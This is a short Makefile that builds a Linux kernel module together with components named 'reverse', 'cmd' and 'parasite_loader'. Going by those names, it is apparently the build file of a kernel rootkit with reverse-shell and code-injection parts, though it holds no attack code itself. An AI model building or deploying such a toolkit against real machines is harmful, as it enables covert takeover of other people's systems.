all:
	mkdir -p bin
	cd sbin && make reverse cmd
	$(MAKE) -C /lib/modules/$(shell uname -r)/build M=$$PWD
	cd parasite_loader && make
clean:
	cd sbin && make clean
	$(MAKE) -C /lib/modules/$(shell uname -r)/build M=$$PWD clean
	cd parasite_loader && make clean
	rm -rf config.h
	